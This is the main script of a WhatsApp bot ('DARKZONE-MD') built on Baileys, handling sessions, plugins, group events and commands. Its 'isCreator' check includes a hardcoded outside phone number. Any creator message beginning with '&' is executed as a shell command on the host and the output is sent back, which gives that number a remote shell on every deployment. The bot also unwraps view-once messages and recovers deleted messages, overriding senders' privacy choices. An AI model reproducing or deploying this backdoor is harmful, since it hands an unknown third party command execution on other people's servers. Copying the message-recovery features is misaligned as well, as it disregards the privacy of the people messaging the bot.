
const axios = require('axios')
const config = require('./config')
const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require(config.BAILEYS)
  
const { getBuffer, getGroupAdmins } = require('./lib/functions')
const { saveMessage } = require('./data')
const fs = require('fs')
const P = require('pino')
const { PresenceControl, BotActivityFilter } = require('./data/presence');
const util = require('util')
const { sms, AntiDelete } = require('./lib')
const FileType = require('file-type');
const { File } = require('megajs')
const os = require('os')
const path = require('path')
const prefix = config.PREFIX
const ownerNumber = ['923306137477']

// Import handlers
const {
    handleStatusView,
    handleStatusReact,
    handleStatusReply,
    handleOwnerNumberReact,
    handleBotOwnerReact,
    handleAutoReact,
    handleCustomReact,
    handleWelcome,
    handleGoodbye,
    handleAdminEvent
} = require('./events/handlers');

// Cache files at startup
let bannedUsers = [];
let sudoUsers = [];
try { bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8')); } catch(e) {}
try { sudoUsers = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8')); } catch(e) {}

// Temp directory
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
setInterval(() => {
    try { fs.readdirSync(tempDir).forEach(f => fs.unlinkSync(path.join(tempDir, f))); } catch(e) {}
}, 5 * 60 * 1000);

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Session
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');
if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

async function loadSession() {
    try {
        if (!config.SESSION_ID) return null;
        console.log('[⏳] Downloading session...');
        const megaFileId = config.SESSION_ID.startsWith('IK~') ? config.SESSION_ID.replace("IK~", "") : config.SESSION_ID;
        const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
        const data = await new Promise((resolve, reject) => {
            filer.download((err, data) => err ? reject(err) : resolve(data));
        });
        fs.writeFileSync(credsPath, data);
        console.log('[✅] Session downloaded');
        return JSON.parse(data.toString());
    } catch (e) {
        console.error('❌ Session error:', e.message);
        return null;
    }
}

async function connectToWA() {
    console.log("[🔰] Connecting to WhatsApp...");
    
    await loadSession();
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: true,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: false,
        auth: state,
        version,
        getMessage: async () => ({})
    });

    // Connection
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log('[🔰] Reconnecting...');
                setTimeout(connectToWA, 3000);
            }
        } else if (connection === 'open') {
            console.log('[🔰] Connected ✅');
            
            // Load plugins
            const pluginPath = path.join(__dirname, 'plugins');
            let pluginCount = 0;
            try {
                fs.readdirSync(pluginPath).forEach((plugin) => {
                    if (plugin.endsWith(".js")) {
                        require(path.join(pluginPath, plugin));
                        pluginCount++;
                    }
                });
                console.log(`[🔰] ${pluginCount} Plugins loaded ✅`);
            } catch(e) {}

            // Connection Message
            setTimeout(async () => {
                try {
                    const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
                    const botName = config.BOT_NAME || 'DARKZONE-MD';
                    const connectMessage = `╭━━━━━━━━━━━━━━━━━━━╮
┃  🤖 *${botName} STARTED*
┃━━━━━━━━━━━━━━━━━━━━
┃ ✅ *Status:* _Online_
┃ 🔌 *Plugins:* _${pluginCount}_
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 ⚙️ *Info* 〕━━━╮
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Mode:* ${config.MODE || 'public'}
╰━━━━━━━━━━━━━━━━━━━╯

⏰ ${new Date().toLocaleString()}`;

                    await conn.sendMessage(botJid, { 
                        image: { url: config.MENU_IMAGE_URL || 'https://files.catbox.moe/jecbfo.jpg' }, 
                        caption: connectMessage
                    });
                    console.log('[🔰] Connect message sent');
                } catch (e) {}
            }, 3000);

            // Always Online
            const setOnline = () => conn.sendPresenceUpdate('available').catch(() => {});
            setOnline();
            setInterval(setOnline, 25000);
            console.log('[🟢] Always Online activated');
        }

        if (qr) console.log('[🔰] Scan QR code');
    });

    conn.ev.on('creds.update', saveCreds);

    // Anti-Delete
    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                AntiDelete(conn, updates).catch(() => {});
            }
        }
    });

    // Group Events (Welcome/Goodbye/Admin)
    conn.ev.on('group-participants.update', async (update) => {
        console.log('[📢] Group event:', update.action);
        handleWelcome(conn, update).catch(() => {});
        handleGoodbye(conn, update).catch(() => {});
        handleAdminEvent(conn, update).catch(() => {});
    });

    // Presence
    conn.ev.on("presence.update", (update) => {
        try { PresenceControl(conn, update); } catch(e) {}
    });
    try { BotActivityFilter(conn); } catch(e) {}

    // Message Handler (OPTIMIZED)
    conn.ev.on('messages.upsert', async(mek) => {
        try {
            mek = mek.messages[0];
            if (!mek.message) return;
            
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                ? mek.message.ephemeralMessage.message : mek.message;

            if (mek.message.viewOnceMessageV2) {
                mek.message = mek.message.viewOnceMessageV2.message;
            }

            // Status handlers (non-blocking)
            handleStatusView(conn, mek);
            handleStatusReact(conn, mek);
            handleStatusReply(conn, mek);

            // Read message
            if (config.READ_MESSAGE === 'true') {
                conn.readMessages([mek.key]).catch(() => {});
            }

            // Save message (non-blocking)
            saveMessage(mek).catch(() => {});

            const m = sms(conn, mek);
            const type = getContentType(mek.message);
            const from = mek.key.remoteJid;
            const body = (type === 'conversation') ? mek.message.conversation 
                : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text 
                : (type === 'imageMessage') ? mek.message.imageMessage?.caption 
                : (type === 'videoMessage') ? mek.message.videoMessage?.caption : '';
            
            const isCmd = body?.startsWith(prefix);
            const budy = typeof mek.text === 'string' ? mek.text : '';
            const args = body?.trim().split(/ +/).slice(1) || [];
            const q = args.join(' ');
            const isGroup = from?.endsWith('@g.us');
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid);
            const senderNumber = sender?.split('@')[0];
            const botNumber = conn.user.id.split(':')[0];
            const pushname = mek.pushName || 'User';
            const isMe = botNumber === senderNumber;
            const isOwner = ownerNumber.includes(senderNumber) || isMe;
            const isReact = m.message?.reactionMessage ? true : false;

            // React handlers (non-blocking)
            handleOwnerNumberReact(conn, mek, senderNumber, isReact);
            handleBotOwnerReact(conn, mek, senderNumber, botNumber, isReact);
            handleAutoReact(conn, mek, isReact);
            handleCustomReact(conn, mek, isReact);

            // Ban check
            if (bannedUsers.includes(sender)) return;

            // Group data (only if needed)
            let groupMetadata, groupAdmins, isBotAdmins, isAdmins;
            const botNumber2 = jidNormalizedUser(conn.user.id);
            
            if (isGroup && isCmd) {
                groupMetadata = await conn.groupMetadata(from).catch(() => ({}));
                const participants = groupMetadata?.participants || [];
                groupAdmins = getGroupAdmins(participants);
                isBotAdmins = groupAdmins.includes(botNumber2);
                isAdmins = groupAdmins.includes(sender);
            }

            const reply = (text) => conn.sendMessage(from, { text }, { quoted: mek });

            // Creator check
            const isCreator = [botNumber, '923306137477', config.DEV, ...sudoUsers]
                .map(v => v?.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
                .includes(sender);

            // Terminal command
            if (isCreator && budy.startsWith("&")) {
                const code = budy.slice(2);
                if (!code) return reply('Provide command');
                const { spawn } = require("child_process");
                const result = spawn(code, { shell: true });
                result.stdout.on("data", d => reply(d.toString()));
                result.stderr.on("data", d => reply(d.toString()));
                return;
            }

            // Owner/Mode checks
            const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
            const isRealOwner = sender === ownerNumberFormatted || isMe || sudoUsers.includes(sender);
            if (!isRealOwner && config.MODE === "private") return;
            if (!isRealOwner && isGroup && config.MODE === "inbox") return;
            if (!isRealOwner && !isGroup && config.MODE === "groups") return;

            // Command handler
            if (isCmd) {
                const events = require('./command');
                const cmdName = body.slice(prefix.length).trim().split(" ")[0].toLowerCase();
                const cmd = events.commands.find(c => c.pattern === cmdName || c.alias?.includes(cmdName));
                
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }}).catch(() => {});
                    try {
                        cmd.function(conn, mek, m, {
                            from, body, isCmd, args, q, text: q, isGroup, sender, senderNumber,
                            botNumber2, botNumber, pushname, isMe, isOwner, isCreator,
                            groupMetadata, groupName: groupMetadata?.subject, 
                            participants: groupMetadata?.participants, groupAdmins,
                            isBotAdmins, isAdmins, reply
                        });
                    } catch (e) {
                        console.error("[CMD ERROR]", e.message);
                    }
                }
            }

            // Event commands
            const events = require('./command');
            events.commands.forEach(cmd => {
                if (body && cmd.on === "body") {
                    cmd.function(conn, mek, m, { from, body, args, q, isGroup, sender, senderNumber, pushname, isMe, isOwner, isCreator, reply });
                }
            });

        } catch(e) {
            // Silent error
        }
    });

    // Helper functions
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            const decode = jidDecode(jid) || {};
            return decode.user && decode.server ? decode.user + '@' + decode.server : jid;
        }
        return jid;
    };

    conn.sendText = (jid, text, quoted = '', options) => 
        conn.sendMessage(jid, { text, ...options }, { quoted });

    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        const buffer = Buffer.isBuffer(path) ? path : 
            /^https?:\/\//.test(path) ? await getBuffer(path) : 
            fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        return conn.sendMessage(jid, { image: buffer, caption, ...options }, { quoted });
    };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        try {
            const res = await axios.head(url);
            const mime = res.headers['content-type'];
            const buffer = await getBuffer(url);
            
            if (mime.includes("gif")) return conn.sendMessage(jid, { video: buffer, caption, gifPlayback: true, ...options }, { quoted });
            if (mime.includes("image")) return conn.sendMessage(jid, { image: buffer, caption, ...options }, { quoted });
            if (mime.includes("video")) return conn.sendMessage(jid, { video: buffer, caption, ...options }, { quoted });
            if (mime.includes("audio")) return conn.sendMessage(jid, { audio: buffer, mimetype: 'audio/mpeg', ...options }, { quoted });
            return conn.sendMessage(jid, { document: buffer, mimetype: mime, caption, ...options }, { quoted });
        } catch(e) {}
    };

    conn.downloadMediaMessage = async(message) => {
        const mime = (message.msg || message).mimetype || '';
        const type = message.mtype?.replace(/Message/gi, '') || mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, type);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
        return buffer;
    };

    conn.parseMention = (text) => [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');

    conn.sendTextWithMentions = (jid, text, quoted, options = {}) => 
        conn.sendMessage(jid, { text, contextInfo: { mentionedJid: conn.parseMention(text) }, ...options }, { quoted });

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        const content = await generateForwardMessageContent(message, forceForward);
        const type = Object.keys(content)[0];
        const waMessage = await generateWAMessageFromContent(jid, content, { ...content[type], ...options });
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
        return waMessage;
    };

    conn.serializeM = mek => sms(conn, mek);
}

app.use(express.static(path.join(__dirname, 'lib')));
app.get('/', (req, res) => res.redirect('/irfan.html'));
app.listen(port, () => console.log(`Server: http://localhost:${port}`));

setTimeout(connectToWA, 3000);
